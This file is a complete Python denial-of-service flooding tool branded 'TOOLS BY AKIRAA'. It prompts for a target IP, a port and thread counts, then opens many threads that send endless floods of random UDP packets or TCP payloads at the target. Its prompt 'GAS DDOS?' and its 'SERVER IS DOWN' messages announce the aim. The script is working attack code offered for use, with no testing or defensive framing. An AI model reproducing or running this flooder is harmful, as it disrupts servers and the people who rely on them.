import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[92m
            TOOLS BY AKIRAA
░░░░░██╗███╗░░██╗███████╗
░░░░░██║████╗░██║██╔════╝
░░░░░██║██╔██╗██║█████╗░░
██╗░░██║██║╚████║██╔══╝░░
╚█████╔╝██║░╚███║███████╗
░╚════╝░╚═╝░░╚══╝╚══════╝

██████╗░░█████╗░░█████╗░██╗░░██╗███████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝
██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░
██╔═══╝░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░
██║░░░░░██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░""")

ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GAS DDOS?(y/n):"))
times = int(input(" PACKET:"))
threads = int(input(" ISI PACKET:"))
def run():
    data = random._urandom(911)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" PERMISI PAKET!!!")
        except:
            print("[#] SERVER IS DOWN!!!")

def run2():
    data = random._urandom(911)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" PERMISI PAKET!!!")
        except:
            s.close()
            print("[#] SERVER IS DOWN!!!")
        
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start() 
